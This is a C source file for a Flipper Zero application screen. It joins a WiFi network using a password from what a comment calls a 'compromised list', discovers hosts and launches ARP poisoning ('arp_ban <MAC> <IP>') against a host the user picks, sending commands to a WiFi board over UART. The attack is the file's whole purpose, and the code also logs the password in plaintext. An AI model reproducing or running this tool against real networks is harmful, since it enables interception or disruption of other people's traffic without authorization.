/**
 * ARP Poisoning from Known Credentials Screen
 *
 * Connects to a WiFi network using known SSID+password, discovers hosts,
 * and performs ARP poisoning on a selected target.
 * Flow:
 *   1. wifi_connect <SSID> <password>
 *   2. list_hosts -> discover hosts
 *   3. User selects host -> arp_ban <MAC> <IP>
 *   Back -> stop, return to main menu
 *
 * Memory lifecycle:
 * - screen_arp_from_creds_create(): Allocates ArpFromCredsData, thread, view
 * - arp_from_creds_cleanup_internal(): Frees everything on screen pop
 */

#include "screen_attacks.h"
#include "uart_comm.h"
#include "screen.h"
#include <gui/modules/text_input.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <furi.h>

#define TAG "ARPCreds"
#define ARP_CREDS_MAX_HOSTS     32
#define ARP_CREDS_PASSWORD_MAX  64
#define ARP_CREDS_TEXT_INPUT_ID 995

// ============================================================================
// Data Structures
// ============================================================================

typedef struct {
    char ip[16];
    char mac[18];
} ArpCredsHostEntry;

typedef struct {
    WiFiApp* app;
    volatile bool attack_finished;
    uint8_t state;
    // 0  = connecting to WiFi
    // 1  = scanning hosts
    // 2  = host list display
    // 3  = ARP poisoning active
    // 10 = confirm saved password (OK=use, Right=enter new)
    // 11 = waiting for password input (TextInput)

    char ssid[33];
    char password[ARP_CREDS_PASSWORD_MAX + 1];

    ArpCredsHostEntry hosts[ARP_CREDS_MAX_HOSTS];
    uint8_t host_count;
    uint8_t selected_host;
    bool hosts_loaded;

    char status_text[64];
    bool connect_failed;

    FuriThread* thread;
    TextInput* text_input;
    bool text_input_added;
    bool password_entered;
    volatile bool password_choice_made;
    volatile bool password_use_saved;
    View* main_view;
} ArpFromCredsData;

typedef struct {
    ArpFromCredsData* data;
} ArpFromCredsModel;

// ============================================================================
// Cleanup
// ============================================================================

void arp_from_creds_cleanup_internal(View* view, void* data) {
    UNUSED(view);
    ArpFromCredsData* d = (ArpFromCredsData*)data;
    if(!d) return;

    FURI_LOG_I(TAG, "ARP from Creds cleanup starting");
    d->attack_finished = true;
    if(d->thread) {
        furi_thread_join(d->thread);
        furi_thread_free(d->thread);
    }

    if(d->text_input) {
        if(d->text_input_added) {
            view_dispatcher_remove_view(d->app->view_dispatcher, ARP_CREDS_TEXT_INPUT_ID);
        }
        text_input_free(d->text_input);
    }

    free(d);
    FURI_LOG_I(TAG, "ARP from Creds cleanup complete");
}

// ============================================================================
// TextInput callback
// ============================================================================

static void arp_creds_password_callback(void* context) {
    ArpFromCredsData* data = (ArpFromCredsData*)context;
    if(!data || !data->app) return;

    FURI_LOG_I(TAG, "Password entered: %s", data->password);
    password_cache_put(data->app, data->ssid, data->password);
    data->password_entered = true;
    data->state = 0; // proceed to connecting

    uint32_t main_view_id = screen_get_current_view_id();
    view_dispatcher_switch_to_view(data->app->view_dispatcher, main_view_id);
}

static void arp_creds_show_text_input(ArpFromCredsData* data) {
    if(!data || !data->text_input) return;

    if(!data->text_input_added) {
        View* ti_view = text_input_get_view(data->text_input);
        view_dispatcher_add_view(data->app->view_dispatcher, ARP_CREDS_TEXT_INPUT_ID, ti_view);
        data->text_input_added = true;
    }

    view_dispatcher_switch_to_view(data->app->view_dispatcher, ARP_CREDS_TEXT_INPUT_ID);
}

// ============================================================================
// Drawing
// ============================================================================

static void arp_from_creds_draw(Canvas* canvas, void* model) {
    ArpFromCredsModel* m = (ArpFromCredsModel*)model;
    if(!m || !m->data) return;
    ArpFromCredsData* data = m->data;

    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);

    if(data->state == 10) {
        screen_draw_title(canvas, "ARP Poisoning");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 2, 22, "Saved password found:");

        char pw_line[22];
        size_t pw_len = strlen(data->password);
        snprintf(pw_line, sizeof(pw_line), "%.21s", data->password);
        canvas_draw_str(canvas, 2, 35, pw_line);
        if(pw_len > 21) {
            snprintf(pw_line, sizeof(pw_line), "%.21s", data->password + 21);
            canvas_draw_str(canvas, 2, 44, pw_line);
        }

        canvas_draw_str(canvas, 2, 64, "OK:use Right:new Back");

    } else if(data->state == 11) {
        screen_draw_title(canvas, "ARP Poisoning");
        canvas_set_font(canvas, FontSecondary);
        screen_draw_centered_text(canvas, "Enter password", 32);
        // TextInput is added by the worker thread (calling it from draw
        // callback would deadlock on the ViewModel mutex).

    } else if(data->state == 0) {
        screen_draw_title(canvas, "ARP Poisoning");
        canvas_set_font(canvas, FontSecondary);
        char line[48];
        char ssid_trunc[20];
        strncpy(ssid_trunc, data->ssid, sizeof(ssid_trunc) - 1);
        ssid_trunc[sizeof(ssid_trunc) - 1] = '\0';
        snprintf(line, sizeof(line), "Connecting to %s...", ssid_trunc);
        screen_draw_centered_text(canvas, line, 32);
        if(data->connect_failed) {
            screen_draw_centered_text(canvas, "Connection FAILED", 46);
            screen_draw_centered_text(canvas, "Press Back", 58);
        }

    } else if(data->state == 1) {
        screen_draw_title(canvas, "ARP Poisoning");
        canvas_set_font(canvas, FontSecondary);
        screen_draw_centered_text(canvas, "Scanning hosts...", 32);
        if(data->status_text[0]) {
            screen_draw_centered_text(canvas, data->status_text, 46);
        }

    } else if(data->state == 2) {
        // Host list table
        screen_draw_title(canvas, "Hosts");
        canvas_set_font(canvas, FontSecondary);

        if(data->host_count == 0) {
            screen_draw_centered_text(canvas, "No hosts found", 32);
        } else {
            uint8_t y = 22;
            uint8_t max_visible = 5;
            uint8_t start_idx = 0;
            if(data->selected_host >= max_visible) {
                start_idx = data->selected_host - max_visible + 1;
            }

            for(uint8_t i = start_idx;
                i < data->host_count && (i - start_idx) < max_visible;
                i++) {
                uint8_t display_y = y + ((i - start_idx) * 9);
                char line[42];
                snprintf(line, sizeof(line), "%-15s %s",
                    data->hosts[i].ip, data->hosts[i].mac);

                if(i == data->selected_host) {
                    canvas_draw_box(canvas, 0, display_y - 7, 128, 9);
                    canvas_set_color(canvas, ColorWhite);
                    canvas_draw_str(canvas, 1, display_y, line);
                    canvas_set_color(canvas, ColorBlack);
                } else {
                    canvas_draw_str(canvas, 1, display_y, line);
                }
            }
        }

    } else if(data->state == 3) {
        // ARP Poisoning active
        screen_draw_title(canvas, "ARP Poisoning");
        canvas_set_font(canvas, FontSecondary);
        screen_draw_centered_text(canvas, "ARP Poisoning Active", 28);

        char line[48];
        snprintf(line, sizeof(line), "IP:  %s", data->hosts[data->selected_host].ip);
        canvas_draw_str(canvas, 2, 42, line);
        snprintf(line, sizeof(line), "MAC: %s", data->hosts[data->selected_host].mac);
        canvas_draw_str(canvas, 2, 54, line);
    }
}

// ============================================================================
// Input Handling
// ============================================================================

static bool arp_from_creds_input(InputEvent* event, void* context) {
    View* view = (View*)context;
    if(!view) return false;

    ArpFromCredsModel* m = view_get_model(view);
    if(!m || !m->data) {
        view_commit_model(view, false);
        return false;
    }
    ArpFromCredsData* data = m->data;

    if(event->type != InputTypeShort && event->type != InputTypeRepeat) {
        view_commit_model(view, false);
        return false;
    }

    if(data->state == 10) {
        if(event->key == InputKeyOk) {
            data->password_use_saved = true;
            data->password_choice_made = true;
            view_commit_model(view, false);
            return true;
        }
        if(event->key == InputKeyRight) {
            data->password[0] = '\0';
            data->state = 11;
            data->password_choice_made = true;
            arp_creds_show_text_input(data);
            view_commit_model(view, false);
            return true;
        }
        if(event->key == InputKeyBack) {
            data->attack_finished = true;
            view_commit_model(view, false);
            screen_pop(data->app);
            return true;
        }

    } else if(data->state == 11) {
        if(event->key == InputKeyOk) {
            arp_creds_show_text_input(data);
            view_commit_model(view, false);
            return true;
        }
        if(event->key == InputKeyBack) {
            data->attack_finished = true;
            view_commit_model(view, false);
            screen_pop(data->app);
            return true;
        }

    } else if(data->state == 0 || data->state == 1) {
        // Connecting / scanning - only back works
        if(event->key == InputKeyBack) {
            data->attack_finished = true;
            uart_send_command(data->app, "stop");
            view_commit_model(view, false);
            screen_pop_to_main(data->app);
            return true;
        }

    } else if(data->state == 2) {
        // Host list
        if(event->key == InputKeyUp) {
            if(data->selected_host > 0) data->selected_host--;
        } else if(event->key == InputKeyDown) {
            if(data->selected_host + 1 < data->host_count) data->selected_host++;
        } else if(event->key == InputKeyOk) {
            if(data->host_count > 0) {
                // Start ARP poisoning on selected host
                data->state = 3;
                char cmd[64];
                snprintf(cmd, sizeof(cmd), "arp_ban %s %s",
                    data->hosts[data->selected_host].mac,
                    data->hosts[data->selected_host].ip);
                FURI_LOG_I(TAG, "Sending: %s", cmd);
                uart_send_command(data->app, cmd);
            }
        } else if(event->key == InputKeyBack) {
            data->attack_finished = true;
            uart_send_command(data->app, "stop");
            view_commit_model(view, false);
            screen_pop_to_main(data->app);
            return true;
        }

    } else if(data->state == 3) {
        // ARP Poisoning active
        if(event->key == InputKeyBack) {
            data->attack_finished = true;
            uart_send_command(data->app, "stop");
            view_commit_model(view, false);
            screen_pop_to_main(data->app);
            return true;
        }
    }

    view_commit_model(view, true);
    return true;
}

// ============================================================================
// Attack Thread
// ============================================================================

static int32_t arp_from_creds_thread(void* context) {
    ArpFromCredsData* data = (ArpFromCredsData*)context;
    WiFiApp* app = data->app;

    FURI_LOG_I(TAG, "Thread started for SSID: %s", data->ssid);

    // Step 0: Confirm saved password (always present, came from compromised list)
    FURI_LOG_I(TAG, "Awaiting user confirmation for saved password");
    data->state = 10;
    while(!data->password_choice_made && !data->attack_finished) {
        furi_delay_ms(50);
    }
    if(data->attack_finished) return 0;

    if(!data->password_use_saved) {
        FURI_LOG_I(TAG, "User chose to enter a new password");
        // Input handler already set state=11 and showed TextInput
        while(!data->password_entered && !data->attack_finished) {
            furi_delay_ms(100);
        }
        if(data->attack_finished) return 0;
    }

    // Step 1: Connect to WiFi
    data->state = 0;
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "wifi_connect %s %s", data->ssid, data->password);
    FURI_LOG_I(TAG, "Sending: %s", cmd);
    furi_delay_ms(200);
    uart_clear_buffer(app);
    uart_send_command(app, cmd);

    bool connected = false;
    uint32_t start = furi_get_tick();
    while((furi_get_tick() - start) < 15000 && !data->attack_finished) {
        const char* line = uart_read_line(app, 500);
        if(line) {
            FURI_LOG_I(TAG, "wifi_connect: %s", line);
            strncpy(data->status_text, line, sizeof(data->status_text) - 1);

            if(strstr(line, "SUCCESS")) {
                connected = true;
                app->wifi_connected = true;
                break;
            }
            if(strstr(line, "FAIL") || strstr(line, "Error") || strstr(line, "error")) {
                data->connect_failed = true;
                FURI_LOG_E(TAG, "Connection failed");
                break;
            }
        }
    }

    if(data->attack_finished) return 0;

    if(!connected) {
        data->connect_failed = true;
        FURI_LOG_E(TAG, "Connection timed out or failed");
        while(!data->attack_finished) {
            furi_delay_ms(100);
        }
        return 0;
    }

    // Step 2: Scan hosts
    data->state = 1;
    snprintf(data->status_text, sizeof(data->status_text), "Sending ARP requests...");
    FURI_LOG_I(TAG, "Scanning hosts");
    furi_delay_ms(200);
    uart_clear_buffer(app);
    uart_send_command(app, "list_hosts");

    bool in_host_section = false;
    start = furi_get_tick();
    uint32_t last_rx = start;

    while((furi_get_tick() - last_rx) < 10000 &&
          (furi_get_tick() - start) < 30000 &&
          !data->attack_finished) {
        const char* line = uart_read_line(app, 500);
        if(line) {
            last_rx = furi_get_tick();
            FURI_LOG_I(TAG, "list_hosts: %s", line);

            if(strstr(line, "=== Discovered Hosts ===")) {
                in_host_section = true;
                continue;
            }

            if(in_host_section) {
                if(strstr(line, "========================") || strstr(line, "Found ")) {
                    in_host_section = false;
                    continue;
                }

                if(data->host_count >= ARP_CREDS_MAX_HOSTS) continue;

                // Skip (MAC unknown) hosts - can't arp_ban without MAC
                if(strstr(line, "(MAC unknown)")) continue;

                // Parse "  IP  ->  MAC  [ARP]"
                char ip[16] = {0};
                char mac[18] = {0};
                const char* arrow = strstr(line, "->");
                if(arrow) {
                    const char* p = line;
                    while(*p == ' ') p++;
                    size_t ip_len = 0;
                    while(p < arrow && *p != ' ' && ip_len < sizeof(ip) - 1) {
                        ip[ip_len++] = *p++;
                    }
                    ip[ip_len] = '\0';

                    p = arrow + 2;
                    while(*p == ' ') p++;
                    size_t mac_len = 0;
                    while(*p && *p != ' ' && *p != '\n' && *p != '\r' && mac_len < sizeof(mac) - 1) {
                        mac[mac_len++] = *p++;
                    }
                    mac[mac_len] = '\0';

                    if(ip[0] && mac[0]) {
                        strncpy(data->hosts[data->host_count].ip, ip,
                            sizeof(data->hosts[0].ip) - 1);
                        strncpy(data->hosts[data->host_count].mac, mac,
                            sizeof(data->hosts[0].mac) - 1);
                        data->host_count++;

                        snprintf(data->status_text, sizeof(data->status_text),
                            "Found %u hosts", data->host_count);
                    }
                }
            }
        }
    }

    data->hosts_loaded = true;
    data->state = 2;
    FURI_LOG_I(TAG, "Found %u hosts", data->host_count);

    // Wait while user interacts with host list or ARP poisoning is active
    while(!data->attack_finished) {
        if(data->state == 3) {
            const char* line = uart_read_line(app, 100);
            if(line) {
                FURI_LOG_I(TAG, "arp_ban output: %s", line);
            }
        } else {
            furi_delay_ms(100);
        }
    }

    FURI_LOG_I(TAG, "Thread finished");
    return 0;
}

// ============================================================================
// Screen Creation
// ============================================================================

View* screen_arp_from_creds_create(
    WiFiApp* app,
    const char* ssid,
    const char* password,
    void** out_data) {

    FURI_LOG_I(TAG, "Creating ARP from Creds screen for SSID: %s", ssid);

    ArpFromCredsData* data = (ArpFromCredsData*)malloc(sizeof(ArpFromCredsData));
    if(!data) return NULL;

    memset(data, 0, sizeof(ArpFromCredsData));
    data->app = app;
    data->attack_finished = false;
    data->state = 10; // start on confirm-saved-password screen
    data->host_count = 0;
    data->selected_host = 0;
    data->hosts_loaded = false;
    data->connect_failed = false;
    data->password_entered = false;
    data->text_input_added = false;
    data->password_choice_made = false;
    data->password_use_saved = false;

    strncpy(data->ssid, ssid, sizeof(data->ssid) - 1);
    data->ssid[sizeof(data->ssid) - 1] = '\0';
    strncpy(data->password, password, sizeof(data->password) - 1);
    data->password[sizeof(data->password) - 1] = '\0';

    View* view = view_alloc();
    if(!view) {
        free(data);
        return NULL;
    }
    data->main_view = view;

    view_allocate_model(view, ViewModelTypeLocking, sizeof(ArpFromCredsModel));
    ArpFromCredsModel* m = view_get_model(view);
    m->data = data;
    view_commit_model(view, true);

    view_set_draw_callback(view, arp_from_creds_draw);
    view_set_input_callback(view, arp_from_creds_input);
    view_set_context(view, view);

    // Create TextInput for re-entering password
    data->text_input = text_input_alloc();
    if(data->text_input) {
        text_input_set_header_text(data->text_input, "Enter Password:");
        text_input_set_result_callback(
            data->text_input,
            arp_creds_password_callback,
            data,
            data->password,
            ARP_CREDS_PASSWORD_MAX,
            true);
        FURI_LOG_I(TAG, "TextInput created");
    }

    // Start thread
    data->thread = furi_thread_alloc();
    furi_thread_set_name(data->thread, "ARPCreds");
    furi_thread_set_stack_size(data->thread, 2048);
    furi_thread_set_callback(data->thread, arp_from_creds_thread);
    furi_thread_set_context(data->thread, data);
    furi_thread_start(data->thread);

    if(out_data) *out_data = data;

    FURI_LOG_I(TAG, "ARP from Creds screen created");
    return view;
}
